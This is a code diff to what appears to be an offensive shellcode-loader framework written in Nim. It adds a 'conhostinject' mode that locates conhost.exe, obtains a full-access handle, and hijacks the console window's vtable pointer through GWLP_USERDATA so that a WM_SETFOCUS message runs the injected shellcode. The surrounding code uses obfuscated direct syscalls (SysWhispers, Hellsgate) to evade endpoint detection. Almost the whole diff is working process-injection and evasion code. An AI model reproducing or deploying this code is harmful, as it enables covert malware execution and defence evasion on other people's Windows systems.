@@ -11,16 +11,17 @@ let ShellcodeRemoteInjectMapSection * = """
 
         when defined(SysWhispers):
             when not defined(spawninject):
-                status = opqiwepoausdasdjl(&tProcess,PROCESS_QUERY_INFORMATION,&oa, &cid)
-                
-                when defined(verbose):
-                    echo obf("[*] NtOpenProcess: "), toHex(status)
-                
-                var highPrivHandle: HANDLE
-                let workedfine = DuplicateHandle(-1, tProcess, -1, &highPrivHandle, PROCESS_ALL_ACCESS, FALSE, 0)
-                when defined(verbose):
-                    echo obf("[*] DuplicateHandle: "), workedfine
-                tProcess = highPrivHandle
+                when not defined(conhostinject):
+                    status = opqiwepoausdasdjl(&tProcess,PROCESS_QUERY_INFORMATION,&oa, &cid)
+                    
+                    when defined(verbose):
+                        echo obf("[*] NtOpenProcess: "), toHex(status)
+                    
+                    var highPrivHandle: HANDLE
+                    let workedfine = DuplicateHandle(-1, tProcess, -1, &highPrivHandle, PROCESS_ALL_ACCESS, FALSE, 0)
+                    when defined(verbose):
+                        echo obf("[*] DuplicateHandle: "), workedfine
+                    tProcess = highPrivHandle
                 
 
             when defined(AllocateDripStyle):
@@ -103,22 +104,23 @@ let ShellcodeRemoteInjectMapSection * = """
                         echo obf("[-] Failed to find opcode for NtOpenProcess")
             
             when not defined(spawninject): # We already got a Handle, no need to open it again. Only for existing processes.
-                status = NtOpenProcess(&tProcess,PROCESS_QUERY_INFORMATION,&oa, &cid)
-                when defined(verbose):
-                    echo obf("[*] NtOpenProcess: "), toHex(status)
-                
-                # duplicate handle to PROCESS_ALL_ACCESS
-                when defined(Hellsgate):
-                    if getSyscall(ntDuplicateTable):
-                        syscall = ntDuplicateTable.wSysCall
-                    else:
-                        when defined(verbose):
-                            echo obf("[-] Failed to find opcode for NtDuplicateObject")
-                var highPrivHandle: HANDLE
-                status = NtDuplicateObject(-1, tProcess, -1, &highPrivHandle, PROCESS_ALL_ACCESS, FALSE, 0)
-                when defined(verbose):
-                    echo obf("[*] NtDuplicateObject: "), status
-                tProcess = highPrivHandle
+                when not defined(conhostinject):
+                    status = NtOpenProcess(&tProcess,PROCESS_QUERY_INFORMATION,&oa, &cid)
+                    when defined(verbose):
+                        echo obf("[*] NtOpenProcess: "), toHex(status)
+                    
+                    # duplicate handle to PROCESS_ALL_ACCESS
+                    when defined(Hellsgate):
+                        if getSyscall(ntDuplicateTable):
+                            syscall = ntDuplicateTable.wSysCall
+                        else:
+                            when defined(verbose):
+                                echo obf("[-] Failed to find opcode for NtDuplicateObject")
+                    var highPrivHandle: HANDLE
+                    status = NtDuplicateObject(-1, tProcess, -1, &highPrivHandle, PROCESS_ALL_ACCESS, FALSE, 0)
+                    when defined(verbose):
+                        echo obf("[*] NtDuplicateObject: "), status
+                    tProcess = highPrivHandle
         
 
             when defined(AllocateDripStyle):
@@ -266,11 +268,34 @@ let ShellcoderemoteinjectStub * = """
             status: NTSTATUS
             success: BOOL
         
-        
-        when defined(SysWhispers):
-            when not defined(spawninject):
-                status = opqiwepoausdasdjl(&tProcess,PROCESS_QUERY_INFORMATION,&oa, &cid)
+        when defined(conhostinject):
+            var
+                udptr: LONG_PTR
+                pid, ppid: DWORD
+                wr: SIZE_T
+                cw: ConsoleWindow
+                dss: LPVOID
+                vTable: ULONG_PTR
+  
+            #hwnd = FindWindowW("ConsoleWindowClass", nil)
+            #GetWindowThreadProcessId(hwnd, addr ppid)
+            let enumResult = EnumWindows(EnumWindowsProc, 0)
+            if not enumResult:
+                GetWindowThreadProcessId(hwnd, addr ppid)
+                pid = getConHostID(ppid)
+                if pid != 0:
+                    when defined(verbose):
+                        echo "[*] Found PID:", pid, "\n"
 
+
+            if pid == 0:
+                when defined(verbose):
+                    echo "[*] Parent id is ", ppid, "\n [-] unable to obtain pid of conhost.exe\n"
+                return
+            else:
+                cid.UniqueProcess = pid
+            when defined(SysWhispers):
+                status = opqiwepoausdasdjl(&tProcess,PROCESS_QUERY_INFORMATION,&oa, &cid)
                 when defined(verbose):
                     echo obf("[*] NtOpenProcess: "), toHex(status)
                 
@@ -280,6 +305,48 @@ let ShellcoderemoteinjectStub * = """
                 when defined(verbose):
                     echo obf("[*] DuplicateHandle: "), workedfine
                 tProcess = highPrivHandle
+
+            else:
+
+                when defined(Hellsgate):
+                    if getSyscall(ntOpenTable):
+                        syscall = ntOpenTable.wSysCall
+                    else:
+                        when defined(verbose):
+                            echo obf("[-] Failed to find opcode for NtOpenProcess")
+            
+                status = NtOpenProcess(&tProcess,PROCESS_QUERY_INFORMATION,&oa, &cid)
+                when defined(verbose):
+                    echo obf("[*] NtOpenProcess: "), status
+                
+                # duplicate handle to PROCESS_ALL_ACCESS
+                when defined(Hellsgate):
+                    if getSyscall(ntDuplicateTable):
+                        syscall = ntDuplicateTable.wSysCall
+                    else:
+                        when defined(verbose):
+                            echo obf("[-] Failed to find opcode for NtDuplicateObject")
+                var highPrivHandle: HANDLE
+                status = NtDuplicateObject(-1, tProcess, -1, &highPrivHandle, PROCESS_ALL_ACCESS, FALSE, 0)
+                when defined(verbose):
+                    echo obf("[*] NtDuplicateObject: "), toHex(status)
+                tProcess = highPrivHandle
+            
+        
+        when defined(SysWhispers):
+            when not defined(spawninject):
+                when not defined(conhostinject):
+                    status = opqiwepoausdasdjl(&tProcess,PROCESS_QUERY_INFORMATION,&oa, &cid)
+
+                    when defined(verbose):
+                        echo obf("[*] NtOpenProcess: "), toHex(status)
+                    
+                    # duplicate handle to PROCESS_ALL_ACCESS
+                    var highPrivHandle: HANDLE
+                    let workedfine = DuplicateHandle(-1, tProcess, -1, &highPrivHandle, PROCESS_ALL_ACCESS, FALSE, 0)
+                    when defined(verbose):
+                        echo obf("[*] DuplicateHandle: "), workedfine
+                    tProcess = highPrivHandle
             
 
             when defined(AllocateDripStyle):
@@ -348,7 +415,29 @@ let ShellcoderemoteinjectStub * = """
                     when defined(verbose):
                         echo obf("[*] Sleeping for "), sleepbetweentime, obf(" seconds")
                     HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
-            
+
+            when defined(conhostinject):
+                udptr = GetWindowLongPtr(hwnd, GWLP_USERDATA)
+                when defined(verbose):
+                    echo "[*] GWLP_USERDATA : ", toHex(udptr), "\n"
+                ReadProcessMemory(tProcess, cast[LPVOID](udptr), cast[LPVOID](addr vTable), sizeof(ULONG_PTR), addr wr)
+                when defined(verbose):
+                    echo "[*] Table         : ", toHex(vTable), "\n"
+                ReadProcessMemory(tProcess, cast[LPVOID](vTable), cast[LPVOID](addr cw), sizeof(ConsoleWindow), addr wr)
+                dss = VirtualAllocEx(tProcess, nil, sizeof(ConsoleWindow), MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
+                cw.GetWindowHandle = cast[uint64](ds)
+                WriteProcessMemory(tProcess, cast[LPVOID](dss), addr cw, sizeof(ConsoleWindow), addr wr)
+                WriteProcessMemory(tProcess, cast[LPVOID](udptr), addr dss, sizeof(ULONG_PTR), addr wr)
+                # Trigger execution
+                SendMessage(hwnd, WM_SETFOCUS, 0, 0)
+                # wait for e.G. Caro-Kann Trigger time
+                Sleep(20000)
+                WriteProcessMemory(tProcess, cast[LPVOID](udptr), addr vTable, sizeof(ULONG_PTR), addr wr)
+                VirtualFreeEx(tProcess, ds, 0, MEM_RELEASE)
+                VirtualFreeEx(tProcess, dss, 0, MEM_RELEASE)
+                CloseHandle(tProcess)
+                # exit program, as we finished
+                quit(0)            
 
             status = zuq8aztsdztausdgbh(&tHandle,THREAD_ALL_ACCESS,NULL,tProcess,ds,NULL, FALSE, 0, 0, 0, NULL)
             when defined(verbose):
@@ -376,22 +465,23 @@ let ShellcoderemoteinjectStub * = """
                         echo obf("[-] Failed to find opcode for NtOpenProcess")
         
             when not defined(spawninject):
-                status = NtOpenProcess(&tProcess,PROCESS_QUERY_INFORMATION,&oa, &cid)
-                when defined(verbose):
-                    echo obf("[*] NtOpenProcess: "), status
-                
-                # duplicate handle to PROCESS_ALL_ACCESS
-                when defined(Hellsgate):
-                    if getSyscall(ntDuplicateTable):
-                        syscall = ntDuplicateTable.wSysCall
-                    else:
-                        when defined(verbose):
-                            echo obf("[-] Failed to find opcode for NtDuplicateObject")
-                var highPrivHandle: HANDLE
-                status = NtDuplicateObject(-1, tProcess, -1, &highPrivHandle, PROCESS_ALL_ACCESS, FALSE, 0)
-                when defined(verbose):
-                    echo obf("[*] NtDuplicateObject: "), toHex(status)
-                tProcess = highPrivHandle
+                when not defined(conhostinject):
+                    status = NtOpenProcess(&tProcess,PROCESS_QUERY_INFORMATION,&oa, &cid)
+                    when defined(verbose):
+                        echo obf("[*] NtOpenProcess: "), status
+                    
+                    # duplicate handle to PROCESS_ALL_ACCESS
+                    when defined(Hellsgate):
+                        if getSyscall(ntDuplicateTable):
+                            syscall = ntDuplicateTable.wSysCall
+                        else:
+                            when defined(verbose):
+                                echo obf("[-] Failed to find opcode for NtDuplicateObject")
+                    var highPrivHandle: HANDLE
+                    status = NtDuplicateObject(-1, tProcess, -1, &highPrivHandle, PROCESS_ALL_ACCESS, FALSE, 0)
+                    when defined(verbose):
+                        echo obf("[*] NtDuplicateObject: "), toHex(status)
+                    tProcess = highPrivHandle
         
             when defined(Hellsgate):
                 if getSyscall(ntAllocTable):
@@ -892,6 +982,28 @@ let ShellcoderemoteinjectStub * = """
                             echo obf("[-] NtProtectVirtualMemory failed! "), repr(protectAddress)
                             quit(1)
 
+            when defined(conhostinject):
+                udptr = GetWindowLongPtr(hwnd, GWLP_USERDATA)
+                when defined(verbose):
+                    echo "[*] GWLP_USERDATA : ", toHex(udptr), "\n"
+                ReadProcessMemory(tProcess, cast[LPVOID](udptr), cast[LPVOID](addr vTable), sizeof(ULONG_PTR), addr wr)
+                when defined(verbose):
+                    echo "[*] Table         : ", toHex(vTable), "\n"
+                ReadProcessMemory(tProcess, cast[LPVOID](vTable), cast[LPVOID](addr cw), sizeof(ConsoleWindow), addr wr)
+                dss = VirtualAllocEx(tProcess, nil, sizeof(ConsoleWindow), MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
+                cw.GetWindowHandle = cast[uint64](ds)
+                WriteProcessMemory(tProcess, cast[LPVOID](dss), addr cw, sizeof(ConsoleWindow), addr wr)
+                WriteProcessMemory(tProcess, cast[LPVOID](udptr), addr dss, sizeof(ULONG_PTR), addr wr)
+                # Trigger execution
+                SendMessage(hwnd, WM_SETFOCUS, 0, 0)
+                # wait for e.G. Caro-Kann Trigger time
+                Sleep(20000)
+                WriteProcessMemory(tProcess, cast[LPVOID](udptr), addr vTable, sizeof(ULONG_PTR), addr wr)
+                VirtualFreeEx(tProcess, ds, 0, MEM_RELEASE)
+                VirtualFreeEx(tProcess, dss, 0, MEM_RELEASE)
+                CloseHandle(tProcess)
+                # exit program, as we finished
+                quit(0)
 
             when defined(threadless):
                 # Use GetRemoteModuleHandle and GetRemoteProcAddress to check for threadlessDLL and threadlessFunction
@@ -1045,8 +1157,9 @@ let ShellcoderemoteinjectStub_notepad * = """
         var tHandle: HANDLE
         var ds: LPVOID
         var sc_size: SIZE_T = cast[SIZE_T](friendlycode.len)
-
-        cid.UniqueProcess = remoteProcID
+        
+        when not defined(conhostinject):
+            cid.UniqueProcess = remoteProcID
 
         when defined(logFile):
             logVerbose(obf("[*] In the Inject function \r\n"))
